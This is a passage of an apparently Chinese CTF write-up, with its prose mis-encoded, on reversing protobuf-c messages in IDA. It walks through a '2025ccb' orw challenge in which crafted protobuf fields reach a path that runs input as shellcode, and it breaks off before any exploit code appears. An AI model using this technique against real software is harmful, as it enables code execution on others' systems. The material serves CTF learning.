*/</span></span><br><span class="line"> PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br></pre></td></tr></table></figure><h2 id="idaç»“æ„ä½“"><a href="#idaç»“æ„ä½“" class="headerlink" title="idaç»“æ„ä½“"></a>idaç»“æ„ä½“</h2><p>ä¸ºäº†æ–¹ä¾¿åœ¨idaä¸­æŸ¥çœ‹ç›¸å…³ç»“æ„ä½“,å¯ä»¥å°†ä¸Šè¿°çš„ä¸¤ä¸ªç»“æ„ä½“æ’å…¥ida,å½“ç„¶éœ€è¦å¤„ç†ä¸€äº›ä¸ç›¸å…³çš„æ•°æ®</p><p><strong><code>ProtobufCMessageDescriptor</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> magic;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *short_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *c_name;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *package_name;</span><br><span class="line">  <span class="type">size_t</span> sizeof_message;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_fields;</span><br><span class="line">  <span class="type">const</span> ProtobufCFieldDescriptor *fields;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *fields_sorted_by_name;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n_field_ranges;</span><br><span class="line">  <span class="type">char</span> *field_ranges;</span><br><span class="line">  __int64 message_init;</span><br><span class="line">  <span class="type">void</span> *reserved1;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong><code>ProtobufCFieldDescriptor</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">uint32_t</span> id;</span><br><span class="line">  <span class="type">int</span> label;</span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> quantifier_offset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *descriptor;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *default_value;</span><br><span class="line">  <span class="type">uint32_t</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> reserved_flags;</span><br><span class="line">  <span class="type">void</span> *reserved2;</span><br><span class="line">  <span class="type">void</span> *reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°è¿™ä¸¤ä¸ªç»“æ„ä½“å¯ä»¥ç›´æ¥å¯¼å…¥idaï¼Œç„¶åé€šè¿‡unpackæ¥å¯»æ‰¾å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessage</span> &#123;</span></span><br><span class="line"><span class="comment">/** The descriptor for this message type. */</span></span><br><span class="line"><span class="type">void</span>*descriptor;</span><br><span class="line"><span class="comment">/** The number of elements in `unknown_fields`. */</span></span><br><span class="line"><span class="type">unsigned</span>n_unknown_fields;</span><br><span class="line"><span class="comment">/** The fields that weren&#x27;t recognized by the parser. */</span></span><br><span class="line"><span class="type">void</span>*unknown_fields;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCBinaryData</span> &#123;</span></span><br><span class="line"><span class="type">size_t</span>len;        <span class="comment">/**&lt; Number of bytes in the `data` field. */</span></span><br><span class="line"><span class="type">uint8_t</span>*data;      <span class="comment">/**&lt; Data bytes. */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Devicemsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int64_t</span> giaoid;</span><br><span class="line">  <span class="type">int64_t</span> giaosize;</span><br><span class="line">  ProtobufCBinaryData giaocontent;</span><br><span class="line">  ProtobufCBinaryData giaotoken;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>_Devicemsg</code>è¦é€šè¿‡<code>proto -c_out=. xxx.proto</code>æœ‰ä¸€ä¸ª.hæ–‡ä»¶ï¼Œå…¶ä¸­å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”çš„å®šä¹‰ï¼Œç„¶åunpackçš„è¿”å›å€¼å°±æ˜¯è¿™ä¸ªç»“æ„ä½“äº†</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="2025ccbå†³èµ›-orw"><a href="#2025ccbå†³èµ›-orw" class="headerlink" title="2025ccbå†³èµ›_orw"></a>2025ccbå†³èµ›_orw</h3><p>æœ‰èŠ±æŒ‡ä»¤ï¼Œç®€å•å»èŠ±ï¼šé¦–å…ˆæŠŠä¸€äº›æ’çœŸçš„æŒ‡ä»¤ç»™ç½®ä¸ºjmpï¼Œå†æŠŠä¸€äº›é—´æ¥è·³è½¬æ¢æˆç›´æ¥è·³è½¬ï¼Œç„¶åå†æŠŠmainå‡½æ•°ç»™<code>create function</code></p><blockquote><p>edit-&gt;function-&gt;create function</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD v3[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_16FE(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;DO U love xiao/a/giao?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%llx&quot;</span>, v3);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)v3[<span class="number">0</span>] == <span class="string">&quot;yes&quot;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give you a replacement egg&quot;</span>);</span><br><span class="line">      sub_1D96();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;I won&#x27;t even give you eggs to replenish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;dword_5008);</span><br><span class="line">    <span class="keyword">if</span> ( dword_5008 &lt;= <span class="number">255</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;dword_5008);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¦è¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€çš„å€¼ä¸Šçš„å€¼æ˜¯yesï¼Œä¹‹åå°±ä¼šè¿›å…¥ä¸€ä¸ªçœŸæ­£çš„ä¸»function</p><p>ç„¶åè¾“å…¥ä¸€ä¸ª<code>&amp;dd_5008</code>åªè¦æ»¡è¶³<code>&lt;=255</code>ï¼Œå°±ä¼šæ³„éœ²ä¸€ä¸ªåœ°å€ï¼Œç„¶åå°±èƒ½å®Œæˆä¸Šé¢çš„æ¡ä»¶äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1D96</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your giao: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  qword_5058 = sub_218D(<span class="number">0LL</span>, v1, buf);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_5058 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your giao is error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_19A1(*(_QWORD *)(qword_5058 + <span class="number">64</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(qword_5058 + <span class="number">24</span>) == <span class="number">1131796LL</span> &amp;&amp; *(_QWORD *)(qword_5058 + <span class="number">32</span>) == <span class="number">4281361LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_1908(*(_QWORD *)(qword_5058 + <span class="number">48</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*(_QWORD *)(qword_5058 + <span class="number">40</span>));</span><br><span class="line">      sub_17CC();</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(qword_5058 + <span class="number">40</span>) &lt; (<span class="type">unsigned</span> __int64)dword_5008 &amp;&amp; v1 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, *(<span class="type">const</span> <span class="type">void</span> **)(qword_5058 + <span class="number">48</span>), *(_QWORD *)(qword_5058 + <span class="number">40</span>));</span><br><span class="line">        ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡ç®€å•åˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:0000000000004B20 ; ===========================================================================</span><br><span class="line">.data.rel.ro:0000000000004B20</span><br><span class="line">.data.rel.ro:0000000000004B20 ; Segment type: Pure data</span><br><span class="line">.data.rel.ro:0000000000004B20 ; Segment permissions: Read/Write</span><br><span class="line">.data.rel.ro:0000000000004B20 _data_rel_ro    segment align_32 public &#x27;DATA&#x27; use64</span><br><span class="line">.data.rel.ro:0000000000004B20                 assume cs:_data_rel_ro</span><br><span class="line">.data.rel.ro:0000000000004B20                 ;org 4B20h</span><br><span class="line">.data.rel.ro:0000000000004B20 stru_4B20       ProtobufCFieldDescriptor &lt;offset aGiaoid, 1, 3, 3, 0, 18h, 0, 0, 0, 0,\</span><br><span class="line">.data.rel.ro:0000000000004B20                                         ; DATA XREF: .data.rel.ro:stru_4C40â†“o ; &quot;giaoid&quot;</span><br><span class="line">.data.rel.ro:0000000000004B20                                           0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004B68                 ProtobufCFieldDescriptor &lt;offset aGiaosize, 2, 3, 3, 0, 20h, 0, 0, 0, \ ; &quot;giaosize&quot;</span><br><span class="line">.data.rel.ro:0000000000004B68                                           0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004BB0                 ProtobufCFieldDescriptor &lt;offset aGiaocontent, 3, 3, 0Fh, 0, 28h, 0, \ ; &quot;giaocontent&quot;</span><br><span class="line">.data.rel.ro:0000000000004BB0                                           0, 0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004BF8                 ProtobufCFieldDescriptor &lt;offset aGiaotoken, 4, 3, 0Fh, 0, 38h, 0, 0, \ ; &quot;giaotoken&quot;</span><br><span class="line">.data.rel.ro:0000000000004BF8                                           0, 0, 0, 0&gt;</span><br><span class="line">.data.rel.ro:0000000000004C40 stru_4C40       ProtobufCMessageDescriptor &lt;28AAEEF9h, offset aGiaoMsgiao, \</span><br><span class="line">.data.rel.ro:0000000000004C40                                         ; DATA XREF: sub_2004+5Bâ†‘o</span><br><span class="line">.data.rel.ro:0000000000004C40                                         ; sub_206C+17â†‘o ...</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset aMsgiao, offset aGiaoMsgiao_0, \ ; &quot;giao.msgiao&quot;</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset aGiao, 48h, 4, offset stru_4B20, \ ; &quot;Msgiao&quot;</span><br><span class="line">.data.rel.ro:0000000000004C40                                             offset unk_3110, 1, offset unk_3120, \</span><br><span class="line">.data.rel.ro:0000000000004C40                                             2004h, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>å®šä¹‰.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">devicemsg</span>&#123;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int64</span> giaoid = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">int64</span> giaosize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> giaocontent = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">required</span> <span class="type">bytes</span> giaotoken = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡ä¸Šè¿°idaç»“æ„ä½“çš„å®šä¹‰å¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1D96</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your giao: &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  giao_message = (_Devicemsg *)unpack(<span class="number">0LL</span>, v1, (__int64)buf);</span><br><span class="line">  <span class="keyword">if</span> ( !giao_message )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your giao is error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_19A1((<span class="type">const</span> <span class="type">char</span> *)giao_message-&gt;giaotoken.data)</span><br><span class="line">    &amp;&amp; giao_message-&gt;giaoid == <span class="number">1131796</span></span><br><span class="line">    &amp;&amp; giao_message-&gt;giaosize == <span class="number">4281361</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1908(giao_message-&gt;giaocontent.data, (<span class="type">unsigned</span> <span class="type">int</span>)giao_message-&gt;giaocontent.len);</span><br><span class="line">    sub_17CC();</span><br><span class="line">    <span class="keyword">if</span> ( giao_message-&gt;giaocontent.len &lt; dword_5008 &amp;&amp; v1 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, giao_message-&gt;giaocontent.data, giao_message-&gt;giaocontent.len);</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ˜¯ä¸€ä¸ªorwçš„shellcodeçš„å†™å…¥ï¼Œshellcodeçš„å†…å®¹å°±æ˜¯contentçš„å†…å®¹ï¼Œå…¶ä¸­é•¿åº¦è¦å°äºä¹‹å‰å†™å…¥<code>dd_5008</code>çš„å€¼ä¸”å°äº0x100ï¼Œä½†æ˜¯tokenå’Œgiaoidï¼Œgiaosizeéƒ½è¦æ»¡è¶³ç›¸å¯¹åº”çš„å€¼ï¼Œæ‰èƒ½è¿›å…¥ç›¸åº”çš„åˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_19A1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-258h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-254h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-250h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-248h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+30h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-238h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+40h] [rbp-230h]</span></span><br><span class="line">  _QWORD v10[<span class="number">32</span>]; <span class="comment">// [rsp+50h] [rbp-220h] BYREF</span></span><br><span class="line">  _WORD v11[<span class="number">12</span>]; <span class="comment">// [rsp+150h] [rbp-120h] BYREF</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+168h] [rbp-108h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+170h] [rbp-100h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+178h] [rbp-F8h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+180h] [rbp-F0h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+188h] [rbp-E8h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+190h] [rbp-E0h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+198h] [rbp-D8h]</span></span><br><span class="line">  __int64 v19; <span class="comment">// [rsp+1A0h] [rbp-D0h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+1A8h] [rbp-C8h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+1B0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+1B8h] [rbp-B8h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+1C0h] [rbp-B0h]</span></span><br><span class="line">  __int64 v24; <span class="comment">// [rsp+1C8h] [rbp-A8h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+1D0h] [rbp-A0h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+1D8h] [rbp-98h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+1E0h] [rbp-90h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+1E8h] [rbp-88h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+1F0h] [rbp-80h]</span></span><br><span class="line">  __int64 v30; <span class="comment">// [rsp+1F8h] [rbp-78h]</span></span><br><span class="line">  __int64 v31; <span class="comment">// [rsp+200h] [rbp-70h]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+208h] [rbp-68h]</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+210h] [rbp-60h]</span></span><br><span class="line">  __int64 v34; <span class="comment">// [rsp+218h] [rbp-58h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+220h] [rbp-50h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+228h] [rbp-48h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+230h] [rbp-40h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+238h] [rbp-38h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+240h] [rbp-30h]</span></span><br><span class="line">  __int64 v40; <span class="comment">// [rsp+248h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v41; <span class="comment">// [rsp+258h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v41 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)v11, <span class="string">&quot;114514giaogiaogiao99&quot;</span>);</span><br><span class="line">  HIBYTE(v11[<span class="number">10</span>]) = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  v17 = <span class="number">0LL</span>;</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  v19 = <span class="number">0LL</span>;</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0LL</span>;</span><br><span class="line">  v22 = <span class="number">0LL</span>;</span><br><span class="line">  v23 = <span class="number">0LL</span>;</span><br><span class="line">  v24 = <span class="number">0LL</span>;</span><br><span class="line">  v25 = <span class="number">0LL</span>;</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  v27 = <span class="number">0LL</span>;</span><br><span class="line">  v28 = <span class="number">0LL</span>;</span><br><span class="line">  v29 = <span class="number">0LL</span>;</span><br><span class="line">  v30 = <span class="number">0LL</span>;</span><br><span class="line">  v31 = <span class="number">0LL</span>;</span><br><span class="line">  v32 = <span class="number">0LL</span>;</span><br><span class="line">  v33 = <span class="number">0LL</span>;</span><br><span class="line">  v34 = <span class="number">0LL</span>;</span><br><span class="line">  v35 = <span class="number">0LL</span>;</span><br><span class="line">  v36 = <span class="number">0LL</span>;</span><br><span class="line">  v37 = <span class="number">0LL</span>;</span><br><span class="line">  v38 = <span class="number">0LL</span>;</span><br><span class="line">  v39 = <span class="number">0LL</span>;</span><br><span class="line">  v40 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0xB95FA87BA6AF366A</span>LL;</span><br><span class="line">  v6 = <span 